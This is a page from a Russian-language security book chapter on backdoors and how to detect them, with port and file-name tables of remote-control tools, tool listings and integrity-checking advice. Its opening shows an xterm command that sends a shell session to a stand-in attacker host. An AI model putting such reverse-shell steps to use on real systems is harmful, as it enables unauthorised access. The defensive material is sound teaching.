На узлах UNIX, на которых не ограничивается исходящий трафик приложения xtenn (TCP 6000). можно модифицировать некоторые из приведенных ранее методов перенаправления портов, чтобы &quot;захватить&quot; окно терминала и перенаправить таким образом оконную командную оболочку обратно на компьютер взломщика. Для этого достаточно запустить Х-сервер, а затем ввести следующую команду.&nbsp;
<br>
<p class="Code">
 xterrn -display attacker.соm:0.О&amp;
</p>

С системой Windows придется повозиться немного больше. Не остается ничего другого, как воспользоваться такими продуктами, как Windows Terminal Server или Independent Computing Architecture (ICA) компании Citrix (http://www.citrix.com). С помощью этих компонентов можно организовать конвейер, связывающий удаленный рабочий стол с компьютером взломщика. В отличие от системы NT4, в Windows 2000 терминальный сервер является встроенным компонентом, который входит в комплект поставки. Так что почти наверняка он окажется доступным. Чтобы определить, установлены ли на взломанном удаленном узле терминальные службы, можно воспользоваться утилитой sclist из набора NTRK. После этого с помощью привилегированной учетной записи нужно установить соединение. Ниже показан пример использования утилиты sciist (для краткости полученный листинг сокращен).
<br>
<p class="Code">
D:\Toclbox&gt;<span class="Text_b">sclist athena</span><br>
- Service list for ath'ena<br>
running  Alerter Alerter<br>
running TermService Terminal Services<br>
running TerrriServLicensing Terminal Services Licensing<br>
stopped TFTFD Trivial FTP Daemon<br>
stopped TlntSvr Telnet<br>
</p>

Если оказалось, что на удаленном узле установлены также средства Terminal Services Licensing, то его можно настроить для работы в режиме сервера приложений, а не в режиме сервера удаленного управления. Это может принести взломщику определенную выгоду (компания Microsoft советует устанавливать сервер лицензирования и терминальный сервер на разные компьютеры).
<br>
<P align="center">
<span class="Text_b">
Общие контрмеры против &quot;потайных ходов&quot;: профилактический осмотр</span></P>
<br>
<p class="Text_n">
Вы познакомились с многочисленными средствами и методами, к которым прибегают взломщики для создания &quot;потайных ходов&quot;. Как же администратор может обнаружить и нейтрализовать оставленные взломщиками следы?
<br>
<P align="center">
<span class="Text_b">
Средства автоматизации</span></P>
<br>
<p class="Text_n">
Как говорится, легче предотвратить, чем обезвредить. Многие современные коммерческие антивирусные программные продукты неплохо работают, автоматически сканируя систему в поисках таких программ. Зачастую они нейтрализуют опасность еще до того, как будет причинен реальный вред (например, до получения доступа к дисководу для гибких дисков или до загрузки вложения электронного сообщения). Достаточно полный перечень производителей антивирусных программ можно найти в статье Q49500 базы знаний компании Microsoft по адресу
<span class="Text_b"> http://support.microsoft.com/support/ kb/articles/Q49/5/00.ASP</span>.
<br>

Недорогая программа The Cleaner, распространяемая компанией MooSoft Development, способна идентифицировать и обезвредить более тысячи различных видов программ типа &quot;троянский конь&quot; (во всяком случае так говорится в рекламных материалах). Для получения более подробной информации обратитесь по адресу
<span class="Text_b">http: //www. moosoft.com/сleaner.html</span>.
<br>

При выборе программы удостоверьтесь, что она способна выполнять поиск по таким важным критериям, как двоичные подписи и параметры системного реестра. Это бывает полезно, если взломщики-тугодумы не догадались внести соответствующие изменения и скрыть свое присутствие. Нужно помнить также о том, что антивирусные программы окажутся эффективными только в том случае, если их базы данных постоянно обновляются!
<br>
<P align="center">
<span class="Text_b">
Ведение учета</span></P>
<br>
<p class="Text_n">
Предположим, что все принятые меры предосторожности не помогли и система все же оказалась взломанной. В такой ситуации единственным оружием против почти всех описанных ранее приемов создания &quot;потайных ходов&quot; является бдительность. Со стороны администратора было бы разумным вести всесторонний учет состояния системы и продумать, где можно быстро разместить надежные данные для восстановления системы. Мы настоятельно рекомендуем выполнять инвентаризацию наиболее важных систем, регистрируя данные как о начальной установке, так и о каждом их обновлении.
<br>

Отслеживание состояния системы в быстро меняющихся условиях, особенно на персональных рабочих станциях, может оказаться довольно утомительным занятием.
А вот на относительно статичных рабочих серверах подобный учет может стать полезным подспорьем в процессе проверки целостности узла, который, вероятно, подвергся нападению. Упростить эту задачу помогают инструменты отображения состояния системы, которые будут рассматриваться ниже в этой главе. В оставшейся части данного раздела обсуждаются методы отслеживания изменений системы &quot;вручную&quot;, которые не требуют дополнительных затрат (многие из них доступны в большинстве систем). Если еше до вторжения последовать простым рекомендациям, приведенным ниже, то после взлома будет гораздо легче понять, что же произошло. Многие из этих методов полезно применить и после нападения, в качестве следственного эксперимента.
<br>
<P align="center">
<span class="Text_b">
Кто прослушивает порты</span></P>
<br>
<p class="Text_n">
Возможно,  это  очевидно,  но никогда  не  стоит недооценивать  мощь утилиты netstat. которая позволяет выявить факт прослушивания портов программами, которые аналогичны рассмотренным выше. Следующий пример демонстрирует полезность этого инструмента (для краткости приводится не весь листинг).
<br>
<p class="Code">
D:\Toolbox&gt;<span class="Text_b">netstat-an</span><br>
Active Connections<br>
Proto Local Address  Foreign Address State<br>
TCP 0.0.0.0:135        0.0.0.0:0 LISTENING<br>
TCP 0.0.0.0:54320      0.0.0.0:0 LISTENING<br>
TCP 192.168.234.36:139 0.0.0.0:0 LISTENING<br>
UDP    0.0.0.0:31337 *:*<br>
</p>

Интересно, догадается ли читатель, что в приведенном фрагменте не согласуется с изложенными выше фактами?
<br>

Единственный недостаток программы netstat заключается в том, что она не сообщает о процессе, который прослушивает тот или иной порт. В системах Windows NT и 2000 с этой же задачей прекрасно справляется программа fport компании Foundstone, Inc.
<br>
<p class="Code">
D:\Toolbox&gt;<span class="Text_b">fport</span><br>
fPort - Process port mapper Copyright (c) 2000, Foundstone, Inc.<br>
http://www.foundstone.com<br>
PID    NAME   TYPE  PORT<br>
222  IEXPLORE UDP   1033<br>
224  OUTLOOK  UDP   1107<br>
224  OUTLOOK  UDP   1108<br>
224  OUTLOOK  TCP   1105<br>
224  OUTLOOK  UDP   1106<br>
224  OUTLOOK  UDP   0<br>
245  MAPISP32 UDP   0<br>
266  nc       TCP   2222<br>
</p>

Из приведенного листинга видно, что порт с номером 2222 прослушивается утилитой netcat. А при использовании программы netstat можно было бы узнать только номер прослушиваемого порта.
<br>

Для сканирования больших сетей и поиска программ прослушивания лучше всего использовать программы-сканеры портов или сетевые средства, которые обсуждались в главе 2.
<br>

Какой бы метод обнаружения прослушиваемых портов не использовался, его результат будет довольно трудно интерпретировать, если вы не знаете, что именно нужно найти. В табл. 14.1 приведен перечень наиболее красноречивых признаков наличия
программного обеспечения удаленного управления.
<br>

Если на каком-либо узле обнаружено прослушивание приведенных в таблице портов, то это верный признак того, что он подвергся нападению либо по злому умыслу хакера либо из-за неосторожности самого администратора. Следует проявлять бдительность также и по отношению к другим портам, которые на первый взгляд кажутся обычными. Во многих из перечисленных средств можно изменять номер прослушиваемого порта (см. таблицу). Чтобы убедиться, что доступ к этим портам из Internet ограничен, нужно использовать устройства обеспечения безопасности на границе сети.
<br>
<P align="center">
<span class="Text_b">
Удаление подозрительных процессов</span></P>
<br>
<p class="Text_n">
Еще одна возможность выявления &quot;потайного хода&quot; заключается в проверке списка процессов на наличие в нем таких исполняемых файлов, как nc, WinVNC. exe и т.д. Для этого в системе NT можно использовать утилиту pulist из набора NTRK, которая выводит все запущенные процессы, или sclist, показывающую работающие службы.
<br>
<P class="text_n"><span class="label">
Таблица 14.1. Номера портов, используемые программами и
удаленного управления при создании &quot;потайных
ходов&quot;
</span></p>
<TABLE  BORDER="1" CELLSPACING="2" CELLPADDING="2" WIDTH="100%" bordercolordark="#000000"
bordercolorlight="#000000" class="border" >
<TR >
<TD   >


<span class="Text_b">
&quot;Потайной ход&quot;</span>
<br>

</TD>
<TD   >


<span class="Text_b">
Порт TCP, используемый по умолчанию</span>
<br>

</TD>
<TD   >


<span class="Text_b">
Порт UDP, используемый по умолчанию</span>
<br>

</TD>
<TD   >


<span class="Text_b">
Возможность использования альтернативных портов</span>
<br>

</TD>
</TR>
<TR >
<TD    >


Remote.exe
<br>

</TD>
<TD    >


135-139
<br>

</TD>
<TD    >


135-139
<br>

</TD>
<TD    >


Нет
<br>

</TD>
</TR>
<TR >
<TD    >


Netcat
<br>

</TD>
<TD    >


Любой
<br>

</TD>
<TD    >


Любой
<br>

</TD>
<TD    >


Да
<br>

</TD>
</TR>
<TR >
<TD    >


Loki
<br>

</TD>
<TD    >


Не используется
<br>

</TD>
<TD    >


Не используется
<br>

</TD>
<TD    >


Не используется
<br>

</TD>
</TR>
<TR >
<TD    >


Реверсивный telnet-сеанс
<br>

</TD>
<TD    >


Любой
<br>

</TD>
<TD    >


Не используется
<br>

</TD>
<TD    >


Да
<br>

</TD>
</TR>
<TR >
<TD    >


Back Orifice
<br>

</TD>
<TD    >


Не используется
<br>

</TD>
<TD    >


31337
<br>

</TD>
<TD    >


Да
<br>

</TD>
</TR>
<TR >
<TD    >


Back Orifice 2000
<br>

</TD>
<TD    >


54320
<br>

</TD>
<TD    >


54321
<br>

</TD>
<TD    >


Да
<br>

</TD>
</TR>
<TR >
<TD    >


NetBus
<br>

</TD>
<TD    >


12345
<br>

</TD>
<TD    >


Не используется
<br>

</TD>
<TD    >


Да
<br>

</TD>
</TR>
<TR >
<TD    >


Masters Paradise
<br>

</TD>
<TD    >


40421,40422,40426
<br>

</TD>
<TD    >


Не используется
<br>

</TD>
<TD    >


Да
<br>

</TD>
</TR>
<TR >
<TD    >


pcAnywhere
<br>

</TD>
<TD    >


22,5631,5632,65301
<br>

</TD>
<TD    >


22, 5632
<br>

</TD>
<TD    >


Нет
<br>

</TD>
</TR>
<TR >
<TD    >


ReachOut
<br>

</TD>
<TD    >


43188
<br>

</TD>
<TD    >


Нет
<br>

</TD>
<TD    >


Нет
<br>

</TD>
</TR>
<TR >
<TD    >


Remotely Anywhere
<br>

</TD>
<TD    >


2000, 2001
<br>

</TD>
<TD    >


Нет
<br>

</TD>
<TD    >


Да
<br>

</TD>
</TR>
<TR >
<TD    >


Remotely
<br>

</TD>
<TD    >


799, 800
<br>

</TD>
<TD    >


800
<br>

</TD>
<TD    >


Да
<br>

</TD>
</TR>
<TR >
<TD    >


Possible/ControllT
<br>

</TD>
<TD    >



<br>

</TD>
<TD    >



<br>

</TD>
<TD    >



<br>

</TD>
</TR>
<TR >
<TD    >


Timbuktu
<br>

</TD>
<TD    >


407
<br>

</TD>
<TD    >


407
<br>

</TD>
<TD    >


Нет
<br>

</TD>
</TR>
<TR >
<TD    >


VNC
<br>

</TD>
<TD    >


5800, 5801
<br>

</TD>
<TD    >


Нет
<br>

</TD>
<TD    >


Да
<br>

</TD>
</TR>
<TR >
<TD    >


Windows Terminal Server
<br>

</TD>
<TD    >


3389
<br>

</TD>
<TD    >


3389
<br>

</TD>
<TD    >


Нет
<br>

</TD>
</TR>
<TR >
<TD    >


NetMeeting Remote Desktop Control
<br>

</TD>
<TD    >


49608, 49609
<br>

</TD>
<TD    >


49608, 49609
<br>

</TD>
<TD    >


Нет
<br>

</TD>
</TR>
<TR >
<TD    >


Citrix ICA
<br>

</TD>
<TD    >


1494
<br>

</TD>
<TD    >


1494
<br>

</TD>
<TD    >


Нет
<br>

</TD>
</TR>
</TABLE>
<p class="Text_n">
Команды pulist и sclist просты в использовании. Их удобно применять в файлах сценариев для автоматизации процесса тестирования как на локальной системе, так и в сети. В качестве примера приведем список процессов, выводимый программой pulist.
<br>
<p class="Code">
С:\nt\ew&gt;<span class="Text_b">pulist</span><br>
Process PID  User<br>
Idle   0<br>
System 2<br>
smss.exe 24       NT AUTHORITYXSYSTEM<br>
CSRSS.EXE 32      NT AUTHORITYXSYSTEM<br>
WINLOGON.EXE 38   NT AUTHORITYXSYSTEM<br>
SERVICES.EXE 46   NT AUTHORITYXSYSTEM<br>
LSASS.EXE 49      NT AUTHORITYXSYSTEM<br>
CMD.EXE 295      TOGA\administrator<br>
nfrbof.exe , 265 TOGA\administrator<br>
UEDIT32.EXE 313  TOGA\administrator<br>
NTVDM.EXE 267    TOGA\administrator<br>
PULIST.EXE 309   TOGA\administrator <br>
C:XntXew&gt;<br>

</p>

В следующем примере с помощью утилиты sclist был получен список работающих на удаленном узле служб.
<br>
<p class="Code">
C:\nt\ew&gt;<span class="Text_b">sclist \\172.29.11.191</span><br>
---------------<br>
- Service list for \\172.29.11.191<br>
---------------<br>
running Alerter Alerter<br>
running Browser Computer Browser<br>
stopped ClipSrv ClipBook Server<br>
running DHCP DHCP Client<br>
running EventLog EventLog<br>
running LanraanServer Server<br>
running LanmanWorkstation Workstation<br>
running LicenseService License Logging Service<br>
stopped Schedule Schedule<br>
running Spooler Spooler<br>
stopped TapiSrv Telephony Service<br>
topped UPS UPS<br>
</p>

В системе UNIX для аналогичных целей можно использовать команду ps. В каждой версии UNIX имеются свои особенности использования этой команды. В Linux она выглядит как ps -aux, а в Solaris — ps -ef. Эти команды могут и должны быть применены при создании сценариев, служащих для получения отчета об изменениях в списке активных процессов. В число других замечательных инструментов системы UNIX, позволяющих получить соответствие между службами и запущенными процессами, входят программы Isof
, которую можно применять в большинстве версий, и sockstat для FreeBSD. Вот пример результатов работы этих утилит.
<br>
<p class="Code">
[crush] <span class="Text_b">lsof -i</span><br>
COMMAND PID  USER FD TYPE DEVICE SIZE/OFF NODE NAME<br>
syslogd 111   root 4u IPv4 Oxc5818fOO OtO UDP *:syslog<br>
dhcpd 183   root 7u IPv4 Oxc5818e40 OtO   UDP *:bootps<br>
dhcpd 183   root lOu IPv4 Oxc5bc2fOO OtO  ICMP *:*<br>
sshd 195   root 3u IPv4 Oxc58d9d80 OtO    TCP *:ssh   (LISTEN)<br>
sshd 1062   root 4u IPv4 OxcSSdaSCO OtO   TCP crush:ssh-<br>
&gt;192. 168.1.101:2420 (ESTABLISHED)<br>
Xaccel 1165   root 3u IPv4 Oxc58dad80 OtO TCP *:6000    (LISTEN)<br>
gnome-ses 1166   root 3u IPv4 Oxc58dab60 OtO TCP *:1043 (LISTEN)<br>
panel 1201   root 5u IPv4 Oxc58da940 OtO  TCP *:1046    (LISTEN)<br>
gnome-nam 1213   root 4u IPv4 Oxc58da2eO OtO TCP *:1048 (LISTEN)<br>
genj.itil_ 1220   root 4u IPv4 Oxc58dbd80 OtO TCP *:1051(LISTEN)<br>
sshd &quot; 1245   root 4u IPv4 Oxc58da720 OtOTCP crush:ssh-<br>
&gt;192.163.I.101:2642 (ESTABLISHED)<br>
[crush] <span class="Text_b">sockstat</span><br>
USER COMMAND PID FD PROTO LOCAL ADDRESS FOREIGN ADDRESS<br>
root sshd 1245 4 tcp4 10.1.1.1.22 192.168.1.101.2642<br>
root genjjtil 1220 4 tcp4 *.1051 *.*<br>
root gnome-na 1213 4 tcp4 *.1048 *.*<br>
root panel 1201 5 tcp4 *.1046 *.*<br>
root gnome-se 1166 3 tcp4 *.1043 *.*<br>
root Xaccel 1165 3 tcp4 *.6000 *.*<br>
root sshd 1062 4 tcp4 10.1.1.1.22 192.168.1.101.2420<br>
root sshd 195 3 tcp4 *.22 *.*<br>
root dhcpd 183 7 udp4 *.67 *.+<br>
root syslogd 111 4 udp4 *.514 *.*<br>
</p>

Конечно же, поскольку большинство из рассмотренных выше программ может быть переименовано, без инвентаризации системы и приложений как при их начальной установке, так и при последующих обновлениях, &quot;потайной ход&quot; будет трудно обнаружить (нам кажется, что об этом говорилось уже достаточно).
<br>
<P align="center">
<span class="Text_b">
Отслеживание изменений файловой системы</span></P>
<br>
<p class="Text_n">
Для перегруженных работой администраторов сама мысль о регулярном обновлении полного списка файлов и каталогов может показаться безумной, поскольку это требует намного больших затрат, чем все предыдущие рекомендации. В то же время, если состояние системы изменяется не очень часто, такой учет является самым надежным методом выявления следов злоумышленников.
<br>

В системе Novell для отслеживания изменений в размерах файлов, времени последнего обращения и других атрибутов можно воспользоваться командой ndir. В системе UNIX можно написать сценарий, содержащий команду Is -la, который будет записывать имя каждого файла и его размер. В Windows при использовании команды dir выводится время последнего изменения, время последнего обращения к файлу, а также ею размер. Для ведения каталога файлов без изменения времени доступа к ним можно порекомендовать утилиты a find, hfind и sfind компании NTObjectives. Помимо прочих достоинств, эти программы позволяют идентифицировать скрытые файлы, а также выявлять потоки данных внутри файлов. Для аудита файлов в системах NT/2000 можно использовать также встроенные возможности файловой системы NTFS. Просто щелкните правой кнопкой мыши на нужном файле или каталоге, выберите команду Security, щелкните на кнопке Auditing, и установите требуемые параметры для каждого пользователя или группы.
<br>

В Windows 2000 появилась подсистема защиты файлов (WFP — Windows File Protection), обеспечивающая защиту системных файлов от перезаписи (к ним относится около 640 файлов из каталога %systemroot%). Интересный побочный эффект этого нововведения состоит в том, что хэш-коды SHA-1 этих важных файлов содержатся в файле каталога %systemroot%\system32\dllcache\nt5.cat. Поэтому, сравнивая эталонные хэш-коды с хэш-кодами текущих системных файлов, можно проверить их целостность. Такую проверку можно выполнить с использованием средства верификации сигнатуры файлов (File Signature Verification, sigverif.exe). Для этого щелкните на кнопке Advanced, перейдите во вкладку Logging и установите режим Append То Existing Log File, чтобы новые результаты можно было сравнивать с полученными ранее. Однако нужно иметь в виду, что в режиме. WFP сигнатура, скорее всего, не связывается с каждым отдельным файлом. Как отметил в мае 2000 года Рус Купер (Russ Cooper), подсистема защиты WFP не замечает копирования одного из &quot;помеченных&quot; файлов поверх другого (например, незамеченным останется копирование notepad.exe поверх wscript.exe). В процессе тестирования поверх файла
wscript.exe мы скопировали файл, не являющийся системным, и утилита sigverif все равно подтвердила его целостность! Поэтому лучше пока не полагаться на эти новые средства, пока не будут разгаданы причины такого странного поведения.
<br>

Среди средств сторонних производителей можно упомянуть программу проверки целостности файлов MDSsum. Она входит в состав пакета Textutils, который распространяется в рамках общей лицензии
GNU.&nbsp; Версию, скомпилированную для системы Windows, можно найти по адресу
<span class="Text_b">http://sourceware.cygnus.com/cygwin/</span>. Утилита MDSsum на основе распространенного алгоритма MD5, разработанного Роном Ривестом (Ron Rivest) из лаборатории компьютерных наук Массачусетского технологического института, позволяет вычислить или проверить профильное сообщение (message digest) файла длиной 128 бит. Описание программы приведено в документе RFC 1321. В следующем примере показано, как программа MDSsum генерирует контрольную сумму файла test, txt, а затем выполняет ее проверку.
<br>
<p class="Code">
D:\Toolbox&gt;<span class="Text_b">md5sum d:\test.txt&gt;d:\test.md5</span><br>
D:\Toolbox&gt;<span class="Text_b">cat d:\test.md5</span><br>
efd3907b04b037774d831596f2clbl4a d:\Xtest.txt<br>
D:\Toolbox&gt;<span class="Text_b">md5sum --check d:\test.md5</span><br>
d:\Xtest.txt: OK<br>
</p>

К сожалению, программа MDSsum одновременно обрабатывает только один файл (конечно, написав сценарий, это можно исправить). В число более эффективных средств выявления вторжений в файловую систему входит старая программа Tripwire, которую можно найти по адресу
<span class="Text_b">http://www.tripwire.com</span>.
<br>

Следует упомянуть и несколько других важных утилит, предназначенных для проверки содержимого двоичных файлов. К ним относится известная программа strings, которая работает как в системе UNIX, так и в Windows, BinText Робина Кайра (Robin Keir) для Windowsи UltraEdit32 для Windows
.
<br>

И наконец, при инвентаризации файловой системы очевидным шагом является поиск легко узнаваемых исполняемых файлов, обеспечивающих &quot;потайной ход&quot;, а также используемых ими библиотек. Поскольку большинство из этих инструментов может быть переименовано, такая процедура обычно не приносит пользы, но устранение очевидных изъянов — это уже половина успеха в битве за обеспечение безопасности сети. В табл. 14.2 приведен список наиболее важных файлов, при обнаружении которых нужно принимать меры, описанные в этой главе.
<br>
<P class="text_n"><span class="label">
Таблица 1 4.2. Используемые пo умолчанию имена исполняемых файлов утилит
удаленногоуправления</span></p>
<TABLE  BORDER="1" CELLSPACING="2" CELLPADDING="2" WIDTH="100%" bordercolordark="#000000"
bordercolorlight="#000000" class="border" >
<TR >
<TD   >


<span class="Text_b">
&quot;Потайной ход&quot;</span>
<br>

</TD>
<TD   >


<span class="Text_b">
Имя файла(ов)</span>
<br>

</TD>
<TD   >


<span class="Text_b">
Возможность переименовать</span>
<br>

</TD>
</TR>
<TR >
<TD    >


remote (NT)
<br>

</TD>
<TD    >


remote . ехе
<br>

</TD>
<TD    >


Есть
<br>

</TD>
</TR>
<TR >
<TD    >


netcat (UNIX и NT)
<br>

</TD>
<TD    >


пс И пс . ехе
<br>

</TD>
<TD    >


Есть
<br>

</TD>
</TR>
<TR >
<TD    >


rinetd
<br>

</TD>
<TD    >


rinetd, rinetd.exe
<br>

</TD>
<TD    >


Есть
<br>

</TD>
</TR>
<TR >
<TD    >


Утилиты туннелирования пакетов 1СМР и UDP
<br>

</TD>
<TD    >


loki И lokid
<br>

</TD>
<TD    >


Есть
<br>

</TD>
</TR>
<TR >
<TD    >


Back Orifice
<br>

</TD>
<TD    >


[пробел] .ехе, boserve.exe, boconfig.exe
<br>

</TD>
<TD    >


Есть
<br>

</TD>
</TR>
<TD   >


Back Orifice 2000
<br>

</TD>
<TD   >


bo2k.exe, bo2kcfg.exe, bo2kgui.exe, UMGR32 . EXE, bo_peep. dll, bo3des . dll
<br>

</TD>
<TD   >


Есть
<br>

</TD>
<TR >
<TD    >


NetBus
<br>

</TD>
<TD    >


patch . exe, NBSvr . exe, KeyHook . dll
<br>

</TD>
<TD    >


Есть
<br>

</TD>
</TR>
<TR >
<TD    >


Virtual Network Computing for Windows (WinVNC)
<br>

</TD>
<TD    >


WinVNC . EXE, VNCHooks . DLL, И OMNITHKEAD_RT.DLL
<br>

</TD>
<TD    >


Нет
<br>

</TD>
</TR>
<TR >
<TD    >


Linux Rootkit (LRK)
<br>

</TD>
<TD    >


Irk
<br>

</TD>
<TD    >


Есть
<br>

</TD>
</TR>
<TR >
<TD    >


NT/2000 Rootkit
<br>

</TD>
<TD    >


deploy . exe и _root_ . sys
<br>

</TD>
<TD    >


Нет в сборке 0.31 а
<br>

</TD>
</TR>
</TABLE>
<P align="center">
<span class="Text_b">
Загрузочный файл и параметры системного реестра</span></P>
<br>
<p class="Text_n">
Взломщикам было бы неинтересно создавать &quot;потайной ход&quot;, если бы после обычной перезагрузки системы или после удаления администратором какой-нибудь необходимой службы, они не имели бы возможности возобновить соединение. Это можно обеспечить, поместив в основных конфигурационных файлах или в системном реестре ссылки на средства создания &quot;потайного хода&quot;. Фактически для функционирования многих из упомянутых программ требуется наличие в системном реестре определенных параметров, что значительно облегчает их идентификацию и удаление.
<br>

Программа Back Orifice добавляет запись в поддерево системного реестра
HKEY_LOCAL_MACHINE\Software\ Microsoft\Windows\CurrentVersion\RunServices\. При установке по умолчанию в системном реестре параметру (Default) присваивается значение &quot; .ехе&quot; ([пробел] .ехе), являющееся принятым по умолчанию именем исполняемого файла сервера ВО, помещенного в каталог C:\windows\system. При установке пакета ВО2К исполняемый файл переименовывается в UMGR32 .ЕХЕ и в системе Win 9x копируется в каталог С: \windows\system. а в NT/2000 — в каталог С: \winnt\system32. Конечно же, взломщик может изменить эти параметры по своему усмотрению. Если какие-либо параметры системного реестра ссылаются на файл размером около 124,928 байт, то существует вероятность, что это файл ВО. Файл ВО2К имеет размер 114,688 байт.&nbsp;
<br>

Последняя версия программы NetBus добавляет несколько параметров в поддерево HKEY_LOCAL_MACHlNE\SOFTWARE\Net Solutions\NetBus Server, однако самый важ-ный ключ создается в
HKEY_LOCAL_MACHlNE\Software\ Microsoft\Windows\CurrentVersionXRun. Он ссылается на исполняемый файл сервера (в более ранних версиях по умолчанию этот файл называется SysEdit, но взломщик может его изменить).
<br>

Пакет WinVNC создает ключ HKEY_USERS\ .DEFAULT\Software\ORL\winVNC3.
<br>

В системе UNIX опасные демоны нужно искать в различных файлах
rс, а также в файле /etc/inetd.conf.
<br>
<P align="center">
<span class="Text_b">
Аудит, проверка учетных записей и ведение журналов регистрации</span></P>
<br>
<p class="Text_n">
Это последняя по порядку, но не по степени важности, контрмера, поскольку невозможно идентифицировать вторжение, если не активизированы средства оповещения. Убедитесь, что подключены встроенные возможности аудита. Например, в NT политику аудита можно настроить с помощью диспетчера пользователей, а в 2000 — с использованием аплета Security Policy. To же самое можно осуществить с помощью утилиты auditpol из набора NTRK. Файловая система NTFS позволяет отслеживать доступ на
уровне отдельных файлов. Для этого в окне проводника Windows щелкните правой кнопкой мыши на требуемой папке или на файле, выберите команду Properties, перейдите во вкладку Security, щелкните на кнопке Auditing и настройте нужные параметры.
<br>
<p class="Prim">
 Известно, что в системе NT4 ведение полного аудита приводит к снижению производительности, поэтому многие не пользовались этой возможностью. Однако тестирование Windows 2000 показало, что в этой операционной системе в режиме аудита потребление ресурсов значительно снижено и замедление ее работы неощутимо даже при использовании всех предоставляемых возможностей.
</p>

Конечно, если журнал регистрации не просматривается регулярно, если его содержимое удаляется из-за недостатка свободного пространства на диске или из-за плохой организации, то даже самый полный аудит окажется бесполезным. Однажды мы посетили Web-узел, который был предупрежден об атаке еще за два месяца до ее реализации. И это случилось только благодаря тому, что некоторые системные администраторы старательно вели журналы регистрации. Чтобы не потерять такую важную информацию, разработайте политику регулярного архивирования журналов регистрации. Многие компании регулярно импортируют их в базы данных, чтобы облегчить процесс поиска и автоматизировать систему оповещения об опасности.
<br>

Кроме того, внимательно следите за необъяснимыми изменениями учетных записей. Здесь могут пригодиться программы сторонних производителей, позволяющие получить &quot;мгновенный снимок&quot; системы. Например, программы DumpSec (ее предыдущая версия называется DumpACL), DumpReg и DumtEvt компании Somarsoft (http://www.-somarsoft.com) предоставляют практически всю нужную информацию о системах NT/2000. Запуск этих утилит выполняется из командной строки.&nbsp;
<br>


</p></td>
  </tr>
</table>
<br>
<table BORDER=0  COLS=3 WIDTH="11%" >
  <tr> 
   <td><a href="Index2.html"><img SRC="Back.gif"  BORDER=0 ></a></td>
    <td WIDTH="10%"><a href="../menu.html"><img SRC="Menu.gif" BORDER=0 ></a></td>
    <td ALIGN=RIGHT><a href="Index4.html"><img SRC="For.gif" BORDER=0 ></a></td>
   
  </tr>
</table>
</body>
</html>
